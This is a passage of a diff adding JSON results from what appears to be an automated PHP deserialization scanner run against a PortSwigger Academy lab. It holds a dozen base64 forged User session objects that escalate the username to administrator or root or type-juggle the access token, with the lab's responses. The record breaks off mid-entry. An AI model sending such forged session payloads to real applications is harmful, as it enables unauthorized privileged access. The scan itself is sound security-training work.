+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2471,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiYzI2ZmI5ZGMxM3EyZzZ2Njh2c3BzeHhpNGJheGx3c3giO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2470",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2470,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjMjZmYjlkYzEzcTJnNnY2OHZzcHN4eGk0YmF4bHdzeCI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2475",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2475,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2695",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2695,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjU6ImFkbWluIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2687",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2687,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjQ6InJvb3QiO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2686",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2686,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjk6InN1cGVydXNlciI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2691",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2691,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "type_juggle",
+          "chain": "access_token->i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtpOjA7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2683",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2683,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        },
+        {
+          "payload_type": "type_juggle_privesc",
+          "chain": "username=administrator + access_token=i:0",
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Response length changed significantly: baseline=10806 mutated=2479",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 10806,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labsEcommerce.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/e"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2479,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting/lab-deseri"
+          }
+        }
+      ]
+    },
+    {
+      "url": "https://0aa700eb032e6b088118265c00b600c3.web-security-academy.net/my-account?id=wiener",
+      "method": "GET",
+      "location": "cookie",
+      "name": "session",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Privilege Escalation — String Manipulation",
+      "suggested_probe": "modify_string",
+      "severity": "Medium",
+      "severity_note": null,
+      "evidence": "dynamic-weak",
+      "notes": "String field detected — try changing role/privilege value",
+      "normalized": [
+        "O:4:\"User\":2:{s:8:\"username\";s:6:\"wiener\";s:12:\"access_token\";s:32:\"c26fb9dc13q2g6v68vspsxxi4baxlwsx\";}"
+      ],
+      "mutations_count": 10,
+      "indicators": [
+        "Status code changed: baseline=200 mutated=500",
+        "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+      ],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2577,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6MzI6ImMyNmZiOWRjMTNxMmc2djY4dnNwc3h4aTRiYXhsd3N4Ijt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2569,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6MTI6ImFjY2Vzc190b2tlbiI7czozMjoiYzI2ZmI5ZGMxM3EyZzZ2Njh2c3BzeHhpNGJheGx3c3giO30=",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2568,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjk6InN1cGVydXNlciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJjMjZmYjlkYzEzcTJnNnY2OHZzcHN4eGk0YmF4bHdzeCI7fQ==",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.99) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2573,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjt9",
+          "signal": "weak",
+          "indicators": [
+            "Status code changed: baseline=200 mutated=500",
+            "Control probe (non-serialized junk) returned the same status 500 and a near-identical body (similarity=0.95) with no deserializer-specific marker — the server reacts the same to any invalid value, so this change is NOT deserialization-specific (downgraded, verify manually)"
+          ],
+          "baseline": {
+            "status": 200,
+            "length": 3406,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n    <body>\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a class=link-back href='https://portswigger.net/web-security/deserialization/exploiting"
+          },
+          "mutated": {
+            "status": 500,
+            "length": 2793,
+            "body_sample": "<!DOCTYPE html>\n<html>\n<!--LAB_HEAD_START-->\n    <head>\n        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>\n        <link href=/resources/css/labs.css rel=stylesheet>\n        <title>Arbitrary object injection in PHP</title>\n    </head>\n<!--LAB_HEAD_END-->\n        <script src=\"/resources/labheader/js/labHeader.js\"></script>\n        <!--LAB_HEADER_START-->\n        <div id=\"academyLabHeader\">\n            <section class='academyLabBanner'>\n                <div class=container>\n                    <div class=logo></div>\n                        <div class=title-container>\n                            <h2>Arbitrary object injection in PHP</h2>\n                            <a id='lab-link' class='button' href='/'>Back to lab home</a>\n                            <a class="
+          }
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
